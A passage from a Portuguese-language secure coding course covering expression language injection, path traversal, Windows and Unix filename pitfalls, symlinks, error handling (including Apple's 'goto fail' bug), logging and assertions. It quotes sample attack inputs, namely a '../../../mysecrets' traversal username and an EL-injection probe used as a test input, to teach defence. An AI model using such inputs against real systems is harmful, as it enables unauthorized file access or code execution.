mais informações, consulte <a href=https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf><em>"Expression Language Injection"</em></a> de Di Paola e Dabirsiaghi (2011) e <a href=http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/ ><em>"Remote Code with Expression Language Injection"</em></a> de Amodio (2012).</p> <p>Obviamente, é importante garantir que as expressões sejam avaliadas apenas quantas vezes forem esperadas (normalmente uma vez). É aconselhável garantir que a configuração faça isso, se houver uma alternativa possível. Se houver alguma preocupação, inclua testes em seu conjunto de testes automatizados para verificar se as expressões estão sendo avaliadas apenas uma vez em contextos seguros, para que qualquer erro futuro seja detectado imediatamente antes de ser usado em produção.</p> <p>No caso do Spring, um teste poderia fornecer dados como <strong>${99999+1}</strong> em uma construção de risco e, em seguida, garantir que o texto de resposta fosse o esperado (e não <strong>100000</strong> ).</p> <h2 id=nomes-de-arquivos>Nomes de arquivos<a class=headerlink href=#nomes-de-arquivos title="Permanent link">¶</a></h2> <p>Tecnicamente, um " <strong>nome de caminho</strong> " é uma sequência de bytes que descreve como encontrar um objeto do sistema de arquivos.</p> <p>Em sistemas do tipo Unix, incluindo Linux, Android, macOS e iOS, um nome de caminho é uma sequência de um ou mais nomes de arquivo separados por um ou mais " <strong>/</strong> ".</p> <p>Em sistemas Windows, um nome de caminho é mais complexo, mas a ideia é a mesma. Na prática, muitas pessoas usam o termo "nome de arquivo" para se referir a nomes de caminho.</p> <p><strong>Nomes de caminho são frequentemente controlados, pelo menos em parte, por um usuário não confiável</strong>.</p> <p>Por exemplo, muitas vezes é útil usar nomes de arquivo como chave para identificar dados relevantes, mas isso pode levar usuários não confiáveis ​​a controlarem os nomes de arquivo.</p> <p>Outro exemplo é o monitoramento ou gerenciamento de sistemas compartilhados (por exemplo, máquinas virtuais ou sistemas de arquivos em contêineres); nesse caso, um monitorado não confiável controla os nomes de arquivo.</p> <p>Mesmo quando um invasor não deveria conseguir obter esse tipo de controle, muitas vezes é importante combater esse tipo de problema como uma medida de defesa em profundidade, para combater invasores que obtêm um pequeno controle.</p> <h2 id=caminho-transversal>Caminho Transversal<a class=headerlink href=#caminho-transversal title="Permanent link">¶</a></h2> <p>Um caso óbvio é que os sistemas geralmente não devem permitir acesso fora de algum diretório (por exemplo, uma "raiz de documentos" de um servidor web).</p> <p>Por exemplo, se um programa tentar acessar um caminho que é uma concatenação de <strong>trusted_root_path</strong> e <strong>username</strong> , o invasor pode criar um username <strong>../../../mysecrets</strong> e burlar as limitações.</p> <p>Essa vulnerabilidade, na qual um invasor pode criar nomes de arquivo que atravessam fora de onde deveria, é tão comum que tem um nome: <em>vulnerabilidades de travessia de diretório</em>.</p> <p>Como sempre, use uma lista de permissões muito limitada para informações que serão usadas para criar nomes de arquivo.</p> <p>Se a lista de permissões do seu aplicativo web não incluir " <strong>.</strong> ", " <strong>/</strong> ", " <strong>~</strong> " e " \ ", na maioria dos sistemas, é significativamente mais difícil atravessar fora da raiz do diretório pretendida. Outra solução comum é converter um caminho relativo em um caminho absoluto normalizado de forma a eliminar todos os usos de " <strong>..</strong> " e, em seguida, garantir que o caminho resultante ainda esteja na região correta do sistema de arquivos.</p> <h2 id=nomes-de-caminho-do-windows>Nomes de caminho do Windows<a class=headerlink href=#nomes-de-caminho-do-windows title="Permanent link">¶</a></h2> <p>Os nomes de caminho do Microsoft Windows podem ser extremamente difíceis de manusear com segurança.</p> <p>As interpretações de nomes de caminho do Windows variam dependendo da versão do Windows e da API utilizada (muitas chamadas usam <strong>CreateFile</strong> , que suporta o prefixo de caminho " \.\ " - e estas interpretam os nomes de caminho de forma diferente das outras chamadas que não suportam).</p> <p>Talvez o mais óbvio seja que " <strong>letter:</strong> " e " <strong>\server\share...</strong> " tenham um significado especial no Windows.</p> <p><strong>Um problema mais grave é que existem nomes de arquivo reservados, cuja forma depende da API utilizada e da configuração local</strong>.</p> <p>Os nomes de dispositivos reservados integrados são os seguintes: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, ​​COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 e LPT9.</p> <p>Pior ainda, os drivers podem criar mais nomes reservados - portanto, não é possível saber com antecedência quais nomes são reservados.</p> <p>Evite criar nomes de arquivo com nomes reservados, com ou sem extensão; se um invasor conseguir induzir o programa a ler/escrever o nome (por exemplo, <strong>com1.txt</strong> ), isso pode (dependendo da API) causar a leitura ou gravação em um dispositivo em vez de um arquivo.</p> <p>Nesse caso, até mesmo caracteres alfanuméricos simples podem causar desastres e ser interpretados como metacaracteres — isso é raro, pois geralmente os alfanuméricos são seguros. O Windows suporta " <strong>/</strong> " como separador de diretório, mas convencionalmente usa " \ " como separador de diretório (o que é irritante, pois <code>\</code> é amplamente usado como caractere de escape).</p> <p>No Windows, não termine um nome de arquivo ou diretório com um espaço ou ponto final; o sistema de arquivos subjacente pode suportá-lo, mas o shell e a interface do usuário do Windows geralmente não. Para obter mais detalhes, consulte a documentação do Microsoft Windows sobre <em><a href=http://msdn.microsoft.com/en-us/library/aa365247.aspx>Nomeação de Arquivos, Caminhos e Namespaces</a></em> .</p> <h2 id=nomes-de-caminho-unixlinux>Nomes de caminho Unix/Linux<a class=headerlink href=#nomes-de-caminho-unixlinux title="Permanent link">¶</a></h2> <p>Nomes de arquivos e caminhos em sistemas do tipo Unix também nem sempre são fáceis de lidar.</p> <p>Na maioria dos sistemas do tipo Unix, um nome de arquivo pode ser qualquer sequência de bytes que não inclua <strong>\0</strong> (o terminador) ou barra.</p> <p>Um equívoco comum é que nomes de arquivos Unix são uma sequência de caracteres. Nomes de arquivos Unix não são uma sequência de um ou mais caracteres; <strong>eles são meramente uma sequência de bytes, portanto, um nome de arquivo não precisa ser uma sequência válida de caracteres</strong>.</p> <p>Por exemplo, embora seja uma convenção comum interpretar nomes de arquivos como uma codificação UTF-8 de caracteres, a maioria dos sistemas não impõe isso. Na verdade, eles tendem a não impor nada, então muitos nomes de arquivos problemáticos podem ser criados, incluindo nomes de arquivos com espaços (ou apenas espaços), caracteres de controle (incluindo quebra de linha, tabulação, escape, etc.), bytes que não são UTF-8 válidos ou incluindo um " <strong>-</strong> " inicial (o marcador para opções de comando). Esses nomes de arquivos problemáticos podem causar problemas mais tarde.</p> <p>Alguns problemas potenciais com nomes de arquivos são específicos do shell, mas problemas com nomes de arquivos não se limitam a ele. Um problema comum é que " <strong>-</strong> " é o sinalizador de opção para muitos comandos, mas é um início válido para um nome de arquivo.</p> <p>Uma solução simples é prefixar todos os globs ou nomes de arquivo, quando necessário, com " <strong>./</strong> " para que não possam começar com " <strong>-</strong> ".</p> <p>Assim, por exemplo, nunca use " ***.pdf** " para se referir a um conjunto de PDFs se um invasor puder influenciar os nomes de arquivo de um diretório; use " <strong>./*.pdf</strong> ".</p> <p>Tenha cuidado ao exibir ou armazenar nomes de caminho, pois eles podem incluir quebras de linha, tabulações, escapes (que podem iniciar controles de terminal) ou sequências que não são strings válidas.</p> <p>Em alguns sistemas, a simples exibição de nomes de arquivo pode invocar controles de terminal, que podem então executar comandos com o privilégio de quem os exibe.</p> <h2 id=manipulacao-de-arquivos-incluindo-acompanhamento-de-links>Manipulação de arquivos (incluindo acompanhamento de links)<a class=headerlink href=#manipulacao-de-arquivos-incluindo-acompanhamento-de-links title="Permanent link">¶</a></h2> <p>Depois de ter um caminho, geralmente você quer fazer algo com ele, como tentar abrir aquele arquivo.</p> <p>Conforme discutido em <a href="https://docs.google.com/document/d/1oN6juqVR7KXuvclHvoY0pr_XQmC6t6uXMLcYphPsUsA/edit#heading=h.7qb5m6rvhvt8">"Cuidado com as Condições de Corrida"</a> , abra arquivos de maneiras que impeçam as condições de corrida TOCTOU (tempo de verificação e tempo de uso).</p> <p>Abra um arquivo diretamente em vez de consultar se o acesso é permitido (pois isso pode mudar). Inclua a opção "exclusivo" (" <strong>x</strong> " ou <strong>O_EXCL</strong> ) se desejar exigir expressamente que o arquivo seja criado. Se estiver criando arquivos temporários, use interfaces projetadas especificamente para criar arquivos temporários com segurança.</p> <p>Se o seu software puder abrir um objeto do sistema de arquivos (incluindo um diretório) que um invasor possa controlar, esteja preparado. Uma maneira de isso acontecer, que ainda não discutimos, é a resolução de link inadequada.</p> <p>A maioria dos sistemas operacionais suporta "links físicos" e "links simbólicos"... mas muitos desenvolvedores não os conhecem ou não os consideram.</p> <p>Um "link físico" cria outro nome que se refere exatamente ao mesmo objeto do sistema de arquivos subjacente, com a mesma propriedade e permissões.</p> <p>Um "link simbólico" (também conhecido como "symlink" ou "link simbólico") é um arquivo especial que contém uma referência a outro arquivo ou diretório na forma de um caminho absoluto ou relativo; uma tentativa de abrir o link simbólico será redirecionada para abrir a referência. Esses links podem ser muito úteis.</p> <p>No entanto, se um invasor conseguir criar esses links em um objeto do sistema de arquivos que seu aplicativo possa abrir, eles também podem ser um problema e os aplicativos devem estar preparados para lidar com eles.</p> <p>Você precisa escrever código preparado para links físicos e simbólicos. Em particular, não presuma que todos os arquivos em um diretório sejam necessariamente de propriedade do proprietário do diretório. Se o seu programa tiver privilégios elevados, talvez seja necessário retirá-los temporariamente antes de manipular o sistema de arquivos.</p> <p>Você também pode abrir arquivos usando a opção <strong>O_NOFOLLOW</strong> em sistemas do tipo Unix; isso desabilita os links simbólicos seguintes no último componente do nome do arquivo (o nome base), mas apenas no último componente, e em algumas linguagens de programação, o uso dessa opção requer etapas adicionais.</p> <p>Versões modernas do Windows suportam links físicos e links simbólicos. No entanto, criá-los normalmente requer privilégios elevados (por exemplo, modo de administrador ou desenvolvedor), portanto, são um método de ataque um pouco menos provável em comparação com sistemas do tipo Unix. Esses tipos de vulnerabilidades ainda ocorrem em sistemas Windows porque usuários privilegiados podem criá-los e alguns aplicativos não foram projetados para usá-los corretamente, levando a vulnerabilidades exploráveis.</p> <p>Há duas medidas comuns que você pode tomar em sistemas do tipo Unix para protegê-los contra muitos tipos de ataques baseados em links, embora elas não combatam todos os ataques:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Todos os diretórios que podem ser gravados por vários usuários também devem ter o bit "sticky" definido. Na maioria dos sistemas modernos do tipo Unix, um diretório com o bit "sticky" definido restringe as alterações permitidas no diretório. Por exemplo, em sistemas Linux, o bit "sticky" significa que apenas o proprietário do arquivo, o proprietário do diretório ou o usuário root podem renomear ou excluir o arquivo. Normalmente, em sistemas do tipo Unix, a inserção e a renomeação de arquivos em um diretório podem ser feitas por todos os usuários com permissão de gravação no diretório, independentemente do proprietário do arquivo. O bit "sticky" normalmente já está definido para diretórios compartilhados preexistentes, como <strong>/tmp</strong> , mas você deve defini-lo especificamente se criar novos diretórios onde a gravação é compartilhada entre os usuários. O bit "sticky" dificulta a execução de alguns tipos de ataques, incluindo aqueles baseados na criação ou alteração de links nesse diretório.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Quando disponível, habilite "links simbólicos fixos protegidos" (também conhecidos como <strong>protected_symlinks</strong> ). Em sistemas com links simbólicos fixos protegidos, um link simbólico só é seguido se estiver fora de um diretório com permissão de escrita no mundo fixo, ou quando o uid do link simbólico e do seguidor corresponderem, ou quando o proprietário do diretório corresponder ao proprietário do link simbólico. Muitas distribuições Linux habilitam isso por padrão, incluindo Ubuntu, Fedora e Red Hat Enterprise Linux.</li> </ul> <h2 id=chamar-apis-para-programas-e-verificar-o-que-e-retornado>Chamar APIs para programas e verificar o que é retornado<a class=headerlink href=#chamar-apis-para-programas-e-verificar-o-que-e-retornado title="Permanent link">¶</a></h2> <p>Ao escrever programas, tente chamar apenas interfaces de programação de aplicativos (APIs) destinadas ao uso por programas.</p> <p>Normalmente, um programa pode invocar qualquer outro programa, incluindo aqueles que são projetados apenas para interação humana. No entanto, geralmente não é sensato invocar um programa destinado à interação humana da mesma forma que um humano faria. O problema é que as interfaces humanas dos programas são intencionalmente ricas em funcionalidades e, muitas vezes, difíceis de controlar completamente. Por exemplo, programas interativos frequentemente possuem códigos de "escape", que podem permitir que um invasor execute funções indesejadas. Além disso, programas interativos frequentemente tentam intuir os padrões "mais prováveis"; esse pode não ser o padrão que você esperava, e um invasor pode encontrar uma maneira de explorar isso.</p> <p>Normalmente, há parâmetros para lhe dar acesso mais seguro à funcionalidade do programa, ou uma API ou aplicativo diferente que se destina ao uso por programas; use-os.</p> <p>O mesmo vale para o contrário. Se você estiver desenvolvendo um aplicativo com uma interface de usuário interativa para humanos, certifique-se de que haja uma maneira de um programa acessar diretamente essa funcionalidade também. Isso facilitará muito a integração do seu aplicativo em algo maior.</p> <p>É claro que, ao receber as informações, certifique-se de verificar se há condições de erro (diretamente ou gerando uma exceção). Se uma solicitação com dados não confiáveis ​​falhar, seu programa não deve continuar tranquilamente como se tivesse sido bem-sucedido. O tratamento de erros é um tópico tão importante que abordaremos a seguir.</p> <h1 id=lidando-com-erros>Lidando com Erros<a class=headerlink href=#lidando-com-erros title="Permanent link">¶</a></h1> <p>Programas reais precisam lidar com erros. Muitos programas de produção são, <em>em sua maioria,</em> voltados para o tratamento de erros, pois há muitos problemas que podem ocorrer no mundo real.</p> <p>O tratamento inadequado de erros pode levar a vulnerabilidades de segurança. Portanto, vamos discutir abordagens comuns para o tratamento de erros e como usá-las com segurança. Basicamente, isso envolve entender seus pontos fortes e fracos e ser cauteloso quanto a suas fraquezas ao utilizá-las.</p> <p>Um exemplo de vulnerabilidade de segurança causada por tratamento incorreto de erros é <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1266">a CVE-2014-1266</a> , comumente chamada de vulnerabilidade " <em>goto fail; goto fail;</em> ". Essa era uma vulnerabilidade na implementação do protocolo SSL/TLS da Apple em muitas versões de seus sistemas operacionais. O problema era uma segunda instrução " <strong>goto fail;</strong> " (duplicada) na função <strong>SSLVerifySignedServerKeyExchange</strong> , como a seguir:</p> <p><strong>if ((err = SSLHashSHA1.update(&amp;hashCtx, &amp;signedParams)) != 0)   goto fail;   goto fail; ... other checks ... fail:   ... buffer frees (cleanups) ...   return err;</strong></p> <p>A indentação aqui é enganosa; como não há chaves após a instrução <strong>if</strong> , a segunda <strong>falha de goto</strong> é sempre executada. No contexto, isso significava que o código de verificação de assinatura vital era ignorado, de modo que assinaturas boas e ruins seriam aceitas. O <strong>goto</strong> externo fazia com que a função retornasse 0 ("sem erro") quando o restante da verificação era ignorado; como resultado, certificados inválidos eram silenciosamente aceitos como válidos. Essa era uma vulnerabilidade desastrosa, pois significava que todos os tipos de certificados inválidos seriam aceitos, comprometendo completamente a segurança. Essa vulnerabilidade seria facilmente detectada por um conjunto de testes automatizados ( <em><a href=https://dwheeler.com/essays/apple-goto-fail.html>The Apple goto fail vulnerability: lessons learned</a></em> , por David A. Wheeler, 2020).</p> <h2 id=codigos-de-retorno>Códigos de retorno<a class=headerlink href=#codigos-de-retorno title="Permanent link">¶</a></h2> <p>Um dos mecanismos mais comuns de tratamento de erros são os códigos de retorno.</p> <p>Um código de retorno é simplesmente um valor único que <em>pode</em> ser o valor de retorno de um método/função/procedimento ou um valor que indica um erro.</p> <p>Por exemplo, "em caso de sucesso, retorna 0..INT_MAX, em caso de erro, retorna -1" ou "em caso de sucesso, retorna um ponteiro, em caso de erro, retorna NULL".</p> <p>Em alguns casos, nada é retornado (pelo menos como seu valor de retorno), portanto, o valor de retorno é simplesmente se houve ou não um erro. Códigos de retorno são a abordagem usual em C, mas são usados ​​em muitas linguagens de programação.</p> <p>Obviamente, ao desenvolver um programa, você precisa garantir que o código de retorno não seja um valor legítimo, para que erros e valores normais <em>possam</em> ser distinguidos.</p> <p>Os códigos de retorno funcionam, mas apresentam muitos problemas ao manter o software ao longo do tempo:</p> <ul> <li>Eles exigem que o chamador verifique se há algum erro em cada valor de retorno para tratá-lo. São fáceis de esquecer e, portanto, um erro comum.</li> <li>Cada método pode ter uma semântica diferente (por exemplo, valores diferentes para indicar "erro"). Geralmente, são <strong>0</strong> , negativo, <strong>INT_MAX</strong> , <strong>NULL</strong> ou algum outro valor especial... mas nem sempre.</li> <li>Se novos tipos de erros forem adicionados, você deverá verificar frequentemente cada chamador para garantir que eles sejam tratados corretamente.</li> <li>Eles levam à mistura de lógica funcional e tratamento de erros. Isso frequentemente cria um código mais complexo, levando a erros e menor produtividade. Em particular, esse código frequentemente falha em desalocar recursos quando necessário.</li> </ul> <p>Na maioria das linguagens de programação, geralmente é melhor usar outro mecanismo (como tratamento de exceções) ao criar a interface, pois códigos de retorno podem facilmente levar a erros ao longo do tempo. Isso não é prático em C portável, já que C não possui muitos outros mecanismos (por exemplo, C não possui um mecanismo padrão para tratamento de exceções). Portanto, se você estiver usando C, considere mover o tratamento de erros para o final da função. Isso separa o tratamento de erros da lógica funcional e simplifica a desalocação correta de recursos. Uma boa explicação dessa abordagem pode ser encontrada no <a href=https://www.kernel.org/doc/Documentation/process/coding-style.rst>Guia de Estilo de Codificação do Kernel Linux</a> .</p> <p>Ao <em>usar</em> uma interface que utiliza códigos de retorno, <em>certifique</em> -se de verificar <em>sempre</em> que houver um código de retorno se uma falha pode levar a uma vulnerabilidade. Por exemplo, cerca de 35 bilhões de dispositivos de Internet das Coisas (IoT) foram encontrados em 2021 com vulnerabilidades de segurança desastrosas devido à geração inadequada de números aleatórios criptográficos. Isso ocorre em parte porque muitos desenvolvedores de software de IoT chamaram diretamente os geradores de números aleatórios de hardware (eles não deveriam fazer isso), mas pior ainda, eles ignoraram os códigos de retorno de erro desses geradores (e <em>definitivamente</em> não deveriam fazer isso). Para mais detalhes sobre este exemplo, consulte <a href=https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng>You're Doing IoT RNG</a> ( <a href="https://www.youtube.com/watch?v=Zuqw0-jZh9Y">apresentação</a> ) de Dan Petro e Allan Cecil, uma apresentação da DEF CON de 2021. Discutiremos a geração de números aleatórios criptográficos com mais detalhes posteriormente.</p> <h2 id=excecoes>Exceções<a class=headerlink href=#excecoes title="Permanent link">¶</a></h2> <p>A maioria das linguagens de programação possui um <em>mecanismo de tratamento de exceções</em> (embora existam, digamos, exceções!).</p> <p>Isso inclui linguagens tão diversas quanto Java, C#, Python, PHP (5+), Perl, Ruby, Tcl, JavaScript, C++, Ada, Smalltalk, Common Lisp, Scheme (6+), Erlang e OCaml. Nesses sistemas, você pode "lançar" ou "gerar" uma exceção quando um erro é detectado, e pode "capturar" ou "resgatar" uma exceção para tratá-la; a pilha é repetidamente desfeita quando uma exceção é lançada até que haja uma captura correspondente. Muitas linguagens definem regiões para capturar (por exemplo, "try").</p> <p>Se você estiver implementando o nível <em>superior</em> de um programa ou framework (por exemplo, seu loop de eventos principal), normalmente deseja capturar todas as exceções (com talvez algumas, digamos, exceções).</p> <p><strong>Registre a exceção</strong> (com alguns detalhes, exceto informações como senhas, que talvez devam ser omitidas do log).</p> <p>Certifique-se de que, após a conclusão da solicitação ou evento, inclusive quando uma exceção for processada, todos os recursos tenham sido retornados, se necessário. Por fim, repita o loop de eventos para processar o próximo evento.</p> <p>O registro pode auxiliar na depuração e na detecção de intrusões. É aceitável informar ao solicitante que "houve um problema" sem fornecer muitos detalhes; é para isso que serve o log interno.</p> <p>Caso contrário, você geralmente deve ser específico sobre as exceções que captura e só capturar uma exceção se puder fazer algo apropriado a respeito. Invasores tentarão disparar exceções, portanto, certifique-se de que os manipuladores de exceção sejam seguros.</p> <h1 id=outras-abordagens-para-tratamento-de-erros>Outras abordagens para tratamento de erros<a class=headerlink href=#outras-abordagens-para-tratamento-de-erros title="Permanent link">¶</a></h1> <p>Existem outras abordagens de tratamento de erros.</p> <p>Algumas linguagens de programação usam construtores de tipos que fornecem um valor de retorno que distingue valores normais de valores de erro.</p> <p>Um bom exemplo disso é <strong>o Maybe</strong> do Haskell , que é definido como " <strong>data Maybe a = Nothing | Just a</strong> ". Isso significa que um valor <strong>Maybe deve ser</strong> <strong>Nothing</strong> ou <strong>Just</strong> a value.</p> <p>Essa abordagem é como um retorno de erro, mas, como o sistema de tipos distingue valor de erros (não valores), você não pode ignorar erros acidentalmente; você precisa extrair o valor para obter um resultado.</p> <p>Algumas linguagens de programação também fornecem construções para fazer essa extração facilmente e, de outra forma, propagar o erro, por exemplo, o <a href=https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html>operador "?" em Rust</a> e <a href=https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html>o encadeamento opcional em Swift</a> . Claro, você pode escrever código intencionalmente para pular o valor de erro (por exemplo, <strong>Nothing</strong> ); tenha cuidado ao fazer isso se isso puder ter um impacto na segurança.</p> <p>Algumas linguagens permitem retornos multivalor e os utilizam para tratamento de erros. Por exemplo, as convenções de erro de Go fazem isso.</p> <p>Funções podem retornar múltiplos valores, e um deles pode ser um valor de erro. Isso evita os riscos de sobrecarga de valores em comparação com os valores de retorno tradicionais. No entanto, assim como os valores de retorno, existe o risco de você se esquecer de verificar o valor de retorno de erro separadamente. Para mais detalhes, consulte <a href=https://blog.golang.org/error-handling-and-go>The Go Blog: Error handling and Go</a> (2011), de Andrew Gerrand.</p> <h2 id=conclusao-sobre-tratamento-de-erros>Conclusão sobre tratamento de erros<a class=headerlink href=#conclusao-sobre-tratamento-de-erros title="Permanent link">¶</a></h2> <p>O tratamento de erros é uma realidade, mas você precisa garantir que seu tratamento de erros (não apenas sua linha "principal") seja seguro.</p> <p>É fácil esquecer de detectar ou tratar erros.</p> <p>Sempre que possível, tente usar abordagens que tenham maior probabilidade de funcionar corretamente, <em>mesmo</em> que o programa seja alterado por outros.</p> <h2 id=registro>Registro<a class=headerlink href=#registro title="Permanent link">¶</a></h2> <p>A melhor maneira de lidar com ataques é evitar que eles tenham qualquer efeito.</p> <p>Infelizmente, como observamos anteriormente, às vezes os invasores conseguem burlar nossas medidas de prevenção.</p> <p>Nesses casos, precisamos detectar o ataque e, em seguida, nos recuperar dele. A detecção é vital, pois muitas vezes não sabemos como acionar a recuperação até detectarmos um problema.</p> <p>Um mecanismo fundamental que permite a detecção é algum tipo de sistema de registro. Os registros podem então ser monitorados, juntamente com outros indicadores, para detectar ataques em andamento.</p> <p>Na prática, registros de diferentes aplicativos são frequentemente enviados para algum recurso centralizado e protegido para simplificar a análise (porque todos os dados estarão em um só lugar) e proteger o histórico de registros, mesmo quando um aplicativo é subvertido. Este curso e programa de certificação profissional não abordarão especificamente como monitorar registros para detectar ataques bem-sucedidos. Em vez disso, nos concentraremos em como enviar informações aos registros para permitir que outros (programas e humanos) façam essa detecção.</p> <p>Ao criar uma aplicação, você geralmente deve enviar dados detalhados para os logs em vez de revelar detalhes do problema a usuários não confiáveis. É aceitável dizer que há um problema, mas não exagere; os invasores adoram quando você fornece dados detalhados sobre seus ataques! Os logs geralmente devem registrar eventos importantes, incluindo seus sucessos ou falhas. Exemplos incluem logins bem-sucedidos, logins malsucedidos e logouts. Além disso, inclua qualquer coisa que possa indicar um ataque ou uma tentativa de contornar as defesas. Certifique-se de fornecer diferentes categorias ou níveis de importância para que a quantidade de informações de log possa ser controlada em tempo de execução.</p> <p>Como o registro é tão importante, muitas aplicações utilizam algum tipo de sistema de registro implementado por uma biblioteca ou aplicação externa. Normalmente, você deve tentar reutilizar sistemas de registro existentes; isso significa menos código para escrever, mais fácil de integrar com outros sistemas e assim por diante. Se você realmente precisar implementar seu próprio sistema, geralmente deve registrar para cada evento a data/hora (com precisão de menos de um segundo), a fonte (máquina e aplicação), uma categoria e detalhes sobre o evento.</p> <p>Mais uma vez, o registro é um mecanismo de segurança que pode se tornar uma vulnerabilidade. Portanto, tenha um sistema de registro em um aplicativo maior, mas implemente-o de forma a neutralizar essas vulnerabilidades em potencial.</p> <p>Dados para logs geralmente incluem dados de usuários não confiáveis, e invasores podem criar dados intencionalmente para atacar o sistema de log ou sistemas posteriores que processam dados de log. Eles podem tentar inserir dados que travem ou assumam o controle do sistema de log, falsificar entradas de log ou criar ataques ao sistema de recuperação de log. A falsificação de logs é um problema particularmente comum, e você não quer construir um sistema que permita que invasores incriminem outros. Para resolver isso, você precisa garantir que todos os dados não confiáveis ​​enviados para um log sejam escapados ou higienizados quando forem armazenados. Muitas APIs de log já fazem isso - certifique-se de que façam isso e, se tiver opção, prefira fortemente usar APIs que façam isso por você. Se não tiver opção, considere implementar um <em>wrapper</em> para codificar os dados de log de forma automática e segura, para que o problema seja automaticamente prevenido.</p> <p>Limite bastante quem pode ler os logs; eles geralmente não devem ser legíveis para todos. No entanto, mesmo isso não é suficiente.</p> <p>Como regra geral, não inclua senhas ou dados muito sensíveis nos logs. Como as pessoas podem precisar revisar os logs posteriormente, os dados dos logs às vezes chegam a mais pessoas do que o esperado. Às vezes, os logs são revelados a terceiros, e o destinatário pode usá-los de maneiras não autorizadas. Cuidado ao incluir dados que possam conter senhas ou chaves privadas! Se você precisar incluir dados possivelmente sensíveis, considere registrá-los como um valor criptografado ou com hash criptográfico, para que as pessoas que receberem o log não possam usá-lo facilmente de forma não autorizada.</p> <h2 id=codigo-de-depuracao-e-assercao-codigo-de-depuracao>Código de Depuração e Asserção: Código de Depuração<a class=headerlink href=#codigo-de-depuracao-e-assercao-codigo-de-depuracao title="Permanent link">¶</a></h2> <p>Às vezes, vulnerabilidades surgem de código de depuração e asserção; vamos falar sobre isso.</p> <p>Os desenvolvedores frequentemente inserem código apenas para obter visibilidade do que está acontecendo. Por exemplo, ao depurar, eles podem inserir instruções de impressão. Eles também podem fazer isso para simplificar os testes ou simplesmente para obter entendimento. Por si só, isso é aceitável, mas existe o risco de deixar esse código de depuração habilitado em produção. Isso é muito mais provável de levar a defeitos e vulnerabilidades de segurança, já que não foram projetados para estarem presentes no software lançado.</p> <p>Portanto, se você inserir código de depuração, separe-o de alguma forma para que seja <em>fácil</em> removê-lo automaticamente. Não importa como; convenções de nomenclatura, sinalizadores do compilador e assim por diante, tudo pode funcionar, desde que seja fácil fazer a coisa <em>certa</em> .</p> <p>Uma boa estratégia a longo prazo é habilitar um sistema de registro antecipadamente e usá-lo ou transformar suas instruções de depuração em instruções de registro. Se você achar útil ver as informações agora, pode ser útil vê-las mais tarde. Isso também significa que, em vez de precisar remover o código de depuração, você pode habilitá-lo facilmente mais tarde, mesmo em um sistema de produção. Esse código de registro deve resistir a ataques, assim como o restante do código.</p> <h2 id=depuracao-e-codigo-de-assercao-assercoes>Depuração e código de asserção: Asserções<a class=headerlink href=#depuracao-e-codigo-de-assercao-assercoes title="Permanent link">¶</a></h2> <p>Muitas linguagens possuem instruções ou expressões "assert" para declarar algo que <em>deve</em> ser sempre verdadeiro em tempo de execução. Elas podem ser úteis para verificar a integridade de um programa enquanto ele é executado. Exemplos incluem a instrução <strong>assert do Java, a instrução</strong> <strong>assert</strong> do Python , a macro <strong>assert()</strong> do C/C++/Rust e o método <strong>assert()</strong> do JavaScript Node.js. </p> <p>Na maioria das linguagens, se a asserção falhar em tempo de execução, uma exceção será lançada.</p> <p>Asserções costumam ser ótimas porque podem impedir problemas antes que se tornem mais sérios. No entanto, se um invasor conseguir fazer com que uma asserção falhe, isso pode levar à saída do aplicativo ou a outro comportamento mais severo do que o necessário. Em particular, quando viável:</p> <ul> <li> <p>Evite permitir que um invasor acione uma asserção. Em particular, <em>nunca</em> use asserções para validação de entradas não confiáveis. Há pelo menos dois bons motivos:</p> <ul> <li>Combater a entrada do invasor é um comportamento <em>esperado</em> !</li> <li>Asserções podem frequentemente ser desabilitadas com sinalizadores do compilador ou de tempo de execução. Isso viola o princípio de ter validação de entrada não contornável para segurança, pois uma abordagem de otimização perfeitamente razoável pode desabilitar acidentalmente uma necessidade vital de segurança.</li> </ul> </li> <li> <p>Limite o escopo da resposta de asserção (manipulador de exceções) à sessão do invasor, sempre que possível. Por exemplo, tente travar apenas essa conexão, não todas, se uma asserção falhar.</p> </li> </ul> <p>Inserir asserções pode tornar uma técnica de verificação chamada "fuzzing" mais eficaz. Portanto, geralmente é uma boa ideia ter muitas asserções, desde que sejam expressões que devam <em>ser</em> sempre verdadeiras. Discutiremos o fuzzing com mais detalhes posteriormente.</p> <h2 id=combatendo-ataques-de-negacao-de-servico-dos>Combatendo ataques de negação de serviço (DoS)<a class=headerlink href=#combatendo-ataques-de-negacao-de-servico-dos title="Permanent link">¶</a></h2> <p>Sistemas seguros devem estar disponíveis para usuários autorizados, mesmo sob ataque.</p> <p>Isso é especialmente difícil se o seu sistema puder ser acessado pela internet pública.</p> <p>Os invasores podem lançar um ataque distribuído de negação de serviço (DDoS) a partir de vários sistemas que controlam, gerando milhões ou bilhões de solicitações. Se um invasor tiver muitos recursos, você pode não conseguir combatê-lo, <em>exceto</em> usando recursos significativos (incluindo dinheiro) para lidar com a carga de trabalho.</p> <p>Uma abordagem é projetar seu sistema para lidar com volumes maiores de tráfego. Dessa forma, as solicitações dos invasores serão facilmente atendidas. Projete seu sistema para ser escalável (por exemplo, por meio de conteinerização) e implante em um sistema em nuvem onde você possa escalar automaticamente (ou pelo menos rapidamente) para tamanhos muito maiores, se houver demanda. Use caches, Redes de Distribuição de Conteúdo (CDNs) e minimize o tempo de execução por solicitação para que mais solicitações possam ser atendidas a cada segundo. Considere usar um site estático, onde esse tipo de site é uma opção viável. Há muitas maneiras de minimizar o tempo de execução (também conhecido como aumentar o desempenho); para muitos sistemas, o uso máximo dos índices do banco de dados e a eliminação das chamadas consultas "N+1" são um bom primeiro passo.</p> <p>No entanto, em algum momento, um invasor que controle recursos suficientes poderá sobrecarregar a maioria dos serviços, a menos que você esteja disposto a gastar uma grande quantia para lidar com eles. Portanto, outra abordagem é se recuperar rapidamente da demanda excessiva causada pelo invasor. Certifique-se de que sua reinicialização possa ser automatizada e que seu sistema possa reiniciar com relativa rapidez. Onde for sensato, tenha um modo de 